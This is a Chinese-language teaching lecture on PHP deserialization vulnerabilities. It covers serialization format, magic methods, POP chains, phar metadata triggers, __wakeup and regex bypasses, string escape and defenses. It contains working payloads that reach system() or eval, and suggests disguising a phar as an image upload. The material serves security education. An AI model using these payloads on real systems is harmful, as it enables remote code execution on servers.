PHP 反序列化

程序把对象压成一段字符串存起来，用的时候再还原。 问题在于：还原的时候，那段字符串里写的是什么，就是什么 —— 而它往往来自用户。

第五讲 · 序列化格式 / 魔术方法 / POP 链 / 五种绕过 · 含 1 个反序列化靶场

这一讲在讲什么

先直觉地想一件事：

如果程序会把一段字符串还原成对象，而这段字符串是你传进去的，

那你其实可以直接画出一个对象 —— 指定它的类、它的每个属性、属性里再放什么。

一个正常的对象，属性值由代码逻辑决定。而你"画"出来的对象， 每个属性都由你说了算。当这个对象后续被使用时， 它就会带着你给的值，走进原本不是为它准备的那条路。

这就是反序列化漏洞的全部核心。剩下的魔术方法、POP 链、phar， 都是在解决一个问题：怎么让这个"假对象"真的被用起来，并且用到危险的地方。

这一讲比前几讲都要绕，因为它要求你能同时看懂三样东西： 序列化字符串长什么样、程序里哪个方法会被自动调用、这两者怎么接上。

先把类和对象捡回来

第二讲讲 Java 时说过 OOP，PHP 这边是同一套概念，只是语法不同。 快速过一遍，重点看几个后面会用到的细节。 

<?php
class student {
    public $name;      // 属性（变量）
    public $class;

    function info() {  // 方法（函数）
        echo "姓名：" . $this->name . "，班级：" . $this->class;
    }
}

$wang = new student();          // 创建对象
$wang->name = "anchun";        // 给属性赋值
$wang->class = "人工智能25";
$wang->info();                 // 调用方法
?>

类是一张图纸，对象是按图纸盖出来的房子。这句话在别处听过，这里再补一句： 反序列化等于"跳过施工队，直接给你一张能住人的房子" —— 你可以把这栋房子的每个房间改成你想要的样子，哪怕图纸上没这么设计。

三个访问修饰符

修饰符类内部子类类外部
public能能能
protected能能不能
private能不能不能

在正常代码里，这三个是封装的手段。但在反序列化里，它们变成了一个格式问题 —— 因为私有和保护属性在序列化字符串里的名字前面会多几个看不见的字节。 下一节细讲。

序列化：对象怎么变成字符串

序列化就是把对象压成一串文本，方便存文件、传网络。 反过来，把这串文本还原成对象，叫反序列化。

方向过程函数
序列化对象 → 字符串serialize()
反序列化字符串 → 对象unserialize()

先看基础类型

serialize(34)          →  i:34;
serialize('uusama')    →  s:6:"uusama";
serialize(true)        →  b:1;
serialize(NULL)        →  N;
serialize(['a'=>1,'b'=>2]) →  a:2:{s:1:"a";i:1;s:1:"b";i:2;}

每种类型一个字母开头，后面跟它的内容：

  • i: 整数（integer）
  • s: 字符串 —— 格式是 s:长度:"内容";，长度很重要
  • b: 布尔（1 真 0 假）
  • N; 空值
  • a: 数组 —— a:元素个数:{键值对...}
  • O: 对象

注意 s:6:"uusama" 里的那个 6 —— 它告诉 PHP"后面读 6 个字符"。 这个长度如果写错了，反序列化就会失败。 记住这一点，后面讲字符串逃逸时全靠它。

对象的格式

<?php
class CC {
    public $user;
    private $pwd;

    public function setPwd($pwd) {
        $this->pwd = $pwd;
    }
}

$a = new CC();
$a->user = "user";
$a->setPwd("pwd");

echo serialize($a);
?>

输出：

O:2:"CC":2:{s:4:"user";s:4:"user";s:7:"CCpwd";s:3:"pwd";}

拆开看：

片段含义
O:这是个对象（Object）
2:"CC"类名长度 2，类名 CC
2:{...}这个对象有 2 个属性
s:4:"user"属性名 user（4 个字符）
s:4:"user"属性值 user
s:7:"CCpwd"属性名 —— 注意这里，长度 7，内容是 CC + pwd

私有属性那几个看不见的字节

上面那个 s:7:"CCpwd"，其实真实内容是： 

\00CC\00pwd

\00 是二进制的 0 字节。私有属性序列化后，名字前后各加一个 \00 和类名。

所以长度是：1（\00）+ 2（类名 CC）+ 1（\00）+ 3（pwd）= 7。

两种修饰符的规则：

修饰符名字前缀长度怎么算
public无原名长度
protected\00*\00原名 + 3
private\00类名\00原名 + 2 + 类名长度

URL 编码之后，\00 会变成 %00。 所以你在浏览器地址栏或者 POST 里传 payload 的时候， 私有属性的 payload 会长这样： 

O:2:"CC":2:{s:4:"user";s:4:"user";s:7:"%00CC%00pwd";s:3:"pwd";}
这个坑几乎人人踩一次

改私有属性的值时，长度算错了就整个 payload 废掉。 比如把 s:3:"pwd" 改成 s:5:"abcd"， 长度 5 对应 4 个字符，反序列化直接报错。

改值的时候一定要顺手改长度。写脚本生成 payload 最省心。

魔术方法：反序列化的触发点

魔术方法是一批以 __ 开头的特殊函数。 它们不用你显式调用，只要对对象做了某个操作，PHP 自己会调。

反序列化之所以危险，就是因为其中几个魔术方法会在"还原对象"的过程中 自动执行 —— 而那时候对象的属性已经是攻击者指定的值了。

方法什么时候触发
__construct()对象创建时
__destruct()对象销毁时
__sleep()序列化之前
__wakeup()反序列化之后
__toString()对象被当成字符串用
__invoke()对象被当成函数调用
__call()调用一个不存在的方法
__get()读一个不存在的属性
__set()给不存在的属性赋值
__isset()对不可访问属性用 isset()
__unset()对不可访问属性用 unset()
__clone()用 clone 复制之后

反序列化时，只有两个会真正被牵动：__wakeup（还原完马上调）和 __destruct（对象被回收时调）。 其余的，得等这个对象被拿去做别的事才会触发 —— 那正是 POP 链要解决的。

最朴素的一个例子：__destruct 执行命令

<?php
class CC {
    public $cmd = "id";

    function __destruct() {
        system($this->cmd);     // 危险动作
    }
}
?>

正常使用时，这段代码没有安全风险 —— 因为 $cmd 是写死在代码里的。 但如果我们能控制反序列化的输入： 

O:2:"CC":1:{s:3:"cmd";s:18:"echo 'hello world'";}

这个字符串被 unserialize() 之后，会创建出一个 CC 对象， 它的 cmd 是 echo 'hello world'。 脚本结束时对象被销毁 → 触发 __destruct → system() 执行了我们的命令。

整个漏洞链条只有两环：可控的输入 → 危险的魔术方法。 剩下的所有内容，都是把这两环接在一起的手段。

__wakeup 为什么经常是"防御"

开发者知道反序列化危险，就会在 __wakeup 里做检查： 

class CC {
    public $user = 'admin';
    public $pwd  = 'admin';

    public function __wakeup() {
        $this->pwd = 'safe_pwd';      // 不管你传什么，都覆盖掉
    }

    public function __destruct() {
        file_put_contents('config.php', $this->pwd);   // 危险动作
    }
}

__wakeup 会在反序列化完成的第一时间执行， 把你辛苦改好的 pwd 洗白。 所以后面第七节专门讲：怎么让它不执行。

其他魔术方法的触发场景（补充）

__toString 容易被低估，因为触发它的地方太多了：

  • echo $obj / print $obj
  • 对象和字符串拼接：$b = "str" . $obj;
  • 参与格式化：printf("%s", $obj)
  • 对象和字符串做 == 比较（PHP 会先转成字符串）
  • 传给 strlen()、addslashes()、die() 这类字符串函数
  • in_array($obj, [...]) 里第一个参数是对象
  • class_exists() 的参数

你写 payload 的时候，看到代码里有一处"把对象当字符串用"，那就是 __toString 的入口。

一条铁律

对某个对象反序列化，只会触发它自己的魔术方法，不会顺带去触发别的类的方法。

想让别的类的方法也被调用，只能把它做成这个对象的属性， 等这个对象的方法去调它 —— 这就是 POP 链。

POP 链：把两个类接起来

上一节说过，反序列化只会触发这个对象自己的魔术方法。 那如果一个类里没有危险的魔术方法，是不是就安全了？

不是。因为它的魔术方法里可能调用了一个属性 —— 而那个属性，可以是你指定的对象。

POP 是什么意思

Property-Oriented Programming，面向属性编程。 名字起得挺玄，说人话就是：

不去改代码，只改对象的属性，让程序自己沿着原有的调用路径，走到你希望它去的地方。

三步：

  1. 找起点 —— 一个会被自动触发的魔术方法（__destruct / __wakeup）
  2. 找终点 —— 一个危险函数（system / eval / file_put_contents / include）
  3. 接起来 —— 起点里调用的某个属性，把它换成能走到终点的那条路上的对象

一个完整的例子

假设有这四个类：

class Logger {
    public $handler;
    public function __construct() { $this->handler = new FileHandler(); }
    public function __destruct() {
        $this->handler->log();      // 起点：销毁时调 handler 的 log()
    }
}

class FileHandler {
    public $filename = 'log.txt';
    public function log() { echo $this->filename; }
}

class Exploit {
    public $rce;
    public function log() { $this->rce->execute(); }   // 中转
}

class RCE {
    public $cmd;
    public function execute() { system($this->cmd); }  // 终点
}

正常业务里，Logger 的 handler 是一个 FileHandler， 结束的时候打印个日志。就这样。

但我们可以在 payload 里把 handler 换成 Exploit： 

O:6:"Logger":1:{s:7:"handler";O:7:"Exploit":1:{s:3:"rce";O:3:"RCE":1:{s:3:"cmd";s:2:"id";}}}

反序列化之后，调用链变成：

Logger::__destruct()
  → $this->handler->log()         // handler 现在是 Exploit
    → Exploit::log()
      → $this->rce->execute()     // rce 是 RCE
        → RCE::execute()
          → system("id")          // 命令执行

代码一行没改，但行为完全变了。 这就是"面向属性编程"的含义 —— 你操纵的不是代码，是对象之间的关系。

跨类构造，一样的打法

class A {
    public $b;
    public function __destruct() { $this->b->methodB(); }  // 起点
}
class B {
    public $c;
    public function methodB() { $this->c->methodC(); }     // 中转
}
class C {
    public $cmd;
    public function methodC() { system($this->cmd); }      // 终点
}

构造的 payload：

O:1:"A":1:{s:1:"b";O:1:"B":1:{s:1:"c";O:1:"C":1:{s:3:"cmd";s:6:"whoami";}}}

调用链就是 A::__destruct → B::methodB → C::methodC → system("whoami")。

找链子的顺序，反着来更快

新手常从起点开始，一层层往下看，很容易迷路。 更快的办法是先把危险函数列出来（哪些类里有 system、eval）， 然后从终点往上倒推：谁调用了这个方法？那个调用者又是谁调用的？

倒推回起点，链子就通了。

实操

打一遍反序列化靶场

  1. 跟着一键启动（端口 8085），或者进目录手动起：
    php -S 127.0.0.1:8085 router.php
  2. 第一关：改一个属性，触发 __destruct 里的危险动作。
  3. 第二关：链子长一点，要把一个对象塞进另一个对象的属性里。
  4. 第三关：过滤函数会把字符串替换掉 —— 利用长度字段做文章。

三关的源码都印在页面上。别急着改 payload，先把类之间的关系画出来。

phar：没有 unserialize 也能触发

前面所有内容都建立在一个前提上：代码里得有个 unserialize($_GET['x'])。 但真实环境里，谁敢这么写？

于是有了另一类触发方式 —— 不显式调用 unserialize， 而是利用 PHP 内部会自动反序列化的地方。phar 就是最经典的一个。

phar 文件是什么

PHAR 是 PHP 的打包格式，把一堆 PHP 文件打成一个归档，类似 zip。 它有一个特点：文件里能存一段"元数据（metadata）"，而这段元数据是序列化后存进去的。

文件结构四段：

  1. stub（标识头） —— 一段 PHP 代码，必须以 __HALT_COMPILER(); ?> 结尾，否则 PHP 不认它是 phar
  2. manifest（清单） —— 存文件的属性、权限，还有序列化的 metadata（攻击点）
  3. 文件内容 —— 打包进去的那些文件
  4. 数字签名 —— 放在最后

生成一个 phar

先改配置：php.ini 里找到 ;phar.readonly = On， 去掉分号，把 On 改成 Off。 （默认只读，不加这步生成不了。） 

<?php
class CC {
    public $output = 'phpinfo();';
    function __destruct() { eval($this->output); }
}

$phar = new Phar("exploit.phar");
$phar->startBuffering();

$phar->setStub("<?php __HALT_COMPILER(); ?>");   // 必须有
$phar->setMetadata(new CC());                    // 元数据，会被序列化
$phar->addFromString("test.txt", "test content");// 随便放点东西

$phar->stopBuffering();
?>

怎么触发

只要有一处文件操作碰到了 phar:// 协议：

$content = file_get_contents('phar://exploit.phar/test.txt');

file_get_contents 是个再普通不过的函数，代码审计时几乎没人会多看它一眼。但底层发生了这些事：

  1. PHP 看到 phar://，去解析这个归档文件
  2. 解析时读到 metadata，自动 unserialize 它
  3. 那个 CC 对象被"复活"，属性是攻击者当初设的值
  4. 脚本结束，对象销毁 → __destruct → eval 执行

整个过程中没有一行 unserialize() 调用。 这就是它能绕过"代码里没有 unserialize 所以安全"这种判断的原因。

PHP 8.0 之后不灵了

这个手法在 PHP 8.0 被收紧了：普通的文件函数遇到 phar:// 时， 默认不再自动解析 metadata。

但如果代码显式创建 Phar 对象并调 getMetadata()， 依然会触发： 

$phar = new Phar('exploit.phar');
$meta = $phar->getMetadata();   // 这里还是会反序列化

所以做题要先看 PHP 版本。

怎么把 phar 传上去

phar 文件的后缀可以改 —— PHP 只认内容结构，不认扩展名。 所以把 exploit.phar 改名成 shell.jpg、avatar.png， 配合第四讲的文件上传漏洞传进去，再找一处 phar:// 的触发点。

这就是第四讲和第五讲接在一起的地方： 上传负责把木马送进去，反序列化负责让它跑起来。

绕过：让 __wakeup 不执行

开发者喜欢在 __wakeup 里做"洗白"： 

class CC {
    public $user = 'admin';
    public $pwd  = 'admin';

    public function __wakeup() {
        $this->pwd = 'safe_pwd';              // 覆盖掉你传入的值
    }
    public function __destruct() {
        file_put_contents('config.php', $this->pwd);   // 危险动作
    }
}

攻击者的目标就变成了：想办法让 __wakeup 不跑， 直接让 __destruct 用上原始值。

老办法：属性个数写大

序列化字符串里有个"属性个数"（O:2:"CC":3:{...} 里的那个 3）。 如果这个数大于真实属性个数，老版本 PHP 会认为解析失败， 跳过 __wakeup 的执行。 

正常：O:2:"CC":2:{s:4:"user";s:5:"admin";s:3:"pwd";s:8:"password";}
绕过：O:2:"CC":3:{s:4:"user";s:5:"admin";s:3:"pwd";s:8:"password";}
                       ↑ 改成 3，但实际只有 2 个属性
版本限制，必须记住

这个漏洞只存在于 PHP 5 < 5.6.25 和 PHP 7 < 7.0.10。 之后的版本已经修了，现在绝大多数环境打不动。

做题时先 phpinfo() 看版本。如果是新版本，直接换思路，别在这上面耗时间。

新办法：fast_destruct

思路变了：不指望跳过 wakeup，而是让 __destruct 先跑。

原理：如果反序列化过程中解析出错，PHP 会把已经建出来的对象立刻当作垃圾回收， 回收就会触发 __destruct。而此时 __wakeup 还没来得及跑。

做法：破坏序列化字符串的结构，比如去掉最后那个大括号：

合法：O:2:"CC":2:{s:4:"user";s:5:"admin";s:3:"pwd";s:6:"hacked";}
破坏：O:2:"CC":2:{s:4:"user";s:5:"admin";s:3:"pwd";s:6:"hacked";
                                                       ↑ 少了 }

解析到一半失败，但已经创建出来的对象会被立刻回收 —— __destruct 先跑，用的还是原始值。

这条比老漏洞值钱

属性个数那个绕过已经废了，但 fast_destruct 是逻辑层面的问题，新版本照样有效。 这也是现在做题更常用的手法。

关键在于：危险的 sink（写文件、执行命令）要放在没有 __wakeup 的类上， 它读的那个内层对象才是被洗白的目标。

几种破坏结构的方式

  • 外层对象属性个数写大
  • 末尾多加一个 ;
  • 内层对象属性个数写大
  • 直接删掉一个闭合括号

都能让解析中途失败。哪个有效，取决于版本和具体代码，逐个试。

其他绕过：引用、正则、字符串逃逸

引用绕过

有些题会这样写：反序列化之后，程序强行给你赋值，再要求两个字段相等。 

$us = unserialize($cmd);          // 你的输入
$us->user1 = "admin";            // 程序强行指定身份
if ($us->user1 == $us->user2) {   // 要求"凭证"和身份一致
    echo $flag;
}

看起来没法过 —— user1 被强制改成 admin 了，user2 得跟着对。

但如果让两个属性指向同一块内存呢？ 

$a = new CC();
$a->user2 = &$a->user1;    // 引用
echo serialize($a);
// O:2:"CC":2:{s:5:"user1";N;s:5:"user2";R:2;}

R:2; 表示"引用第 2 个值"。这样一来， 改 user1 等于改 user2，判断自然成立。

正则绕过

题目可能会用正则拦一下开头：

if (preg_match('/^O:\d+/', $cmd)) die('不许传对象');

三种绕法：

  • 加号。O:+2:"CC":... —— 正则是 \d+，不认 +， 但 PHP 的解析器认。URL 里 + 要编码成 %2B。
  • 套一层数组。a:1:{i:0;O:2:"CC":...} —— 开头变成 a:，正则不匹配，但里面的对象照样会被反序列化。
  • 大写 S。序列化字符串里类型字母大写 S 时， PHP 会按十六进制解析后面的字符串： 
    O:2:"CC":2:{S:4:"\75ser";s:5:"admin";s:3:"pwd";s:8:"password";}
                    ↑ 大写 S，\75 是 'u' 的十六进制
    这样 user 这个词不会以明文出现在 payload 里，能绕过字符串匹配。

字符串逃逸：靠长度字段做文章

这是最能体现"序列化格式细节"的一种。前提是程序会对你传入的序列化字符串先过滤、再反序列化。

替换后变长

function filter($str) {
    return str_replace('bb', 'ccc', $str);   // 2 个字符换成 3 个
}

每替换一次，字符串就多出一个字符。 而反序列化是严格按 s:长度:"内容" 里的长度去读的。

于是你就可以用这些"多出来的字符"，把某个属性值的结尾提前/推迟， 让你写的内容跑到字符串结构里，凭空多出一个属性。

比如目标是让类里多出一个 hack 属性：

// 想让序列化结果变成这样
O:1:"A":2:{s:4:"name";s:5:"admin";s:4:"hack";s:7:"hacker!";}

// 实际操作：把 name 填成 84 个 bb 加一段 payload
$a->name = str_repeat('bb', 42) . '";s:4:"hack";s:7:"hacker!";}';

// 序列化出来 s:84:"..."
// 过滤之后 bb 全变 ccc，长度对不上了，后面的结构就被"吃掉"重排

最终反序列化时，PHP 按 84 读完了那串 c...c， 后面那个 ";s:4:"hack";s:7:"hacker!";} 正好接上， 于是 hack 属性就被造出来了。

替换后变短

反过来更直观：str_replace('ccc', 'bb', $str)，每替换一次少一个字符。

你写 18 组 ccc，过滤后变成 18 组 bb，短了 18 个字符。

那 18 个字符的位置，正好由后面的属性值补上来 —— 所以你要精心安排：让 ";s:4:"pass";s:3: 这段被吃掉， 再让 pass 的值接上一段完整的属性定义。 

// name 填 57 个 c（过滤后变短）
// pass 填 ";s:4:"hack";s:7:"hacker!";}'
// 过滤后，pass 的内容就"补"进了本该属于结构的位置
怎么算长度

别手算。写脚本，序列化之后打印出来，逐字符数。 或者反过来：先写好目标字符串，再倒推需要多少组 bb/ccc。

手算十次错九次，浪费的时间够写三个脚本。

防御

反序列化的防御比 SQL 注入简单，因为核心只有一句话：

不要对用户可控的数据调用 unserialize()。

四条实际做法

措施说明
换成 JSON 最彻底。传输数据用 json_encode / json_decode， JSON 里没有"类型"，不可能还原出对象，也就没有魔术方法可触发。
签名 / HMAC 如果非要用序列化，就给数据加个签名。服务端先验签， 不通过就拒绝 —— 这样用户改不了一个字节。
限制可反序列化的类 PHP 7 以后 unserialize() 的第二个参数可以白名单： 
unserialize($data, ['allowed_classes' => ['MyClass']]);
只允许还原你需要的那个类，别的类一律变成 __PHP_Incomplete_Class， 魔术方法不会被调用。
升级版本 PHP 8.0 之后 phar 的自动解析收紧了，wakeup 那个老漏洞也早修了。 但 fast_destruct 这类逻辑问题还在，不能只靠升级。
为什么"过滤关键词"不顶用

你可能想过滤 O:、过滤 system、过滤 __destruct。 但上面第七节已经演示了三种绕法（加号、数组嵌套、大写 S）， 再加上字符串逃逸，黑名单几乎必然被绕。

这类漏洞的正确解法永远是"别让数据进反序列化"，不是"把数据洗干净"。
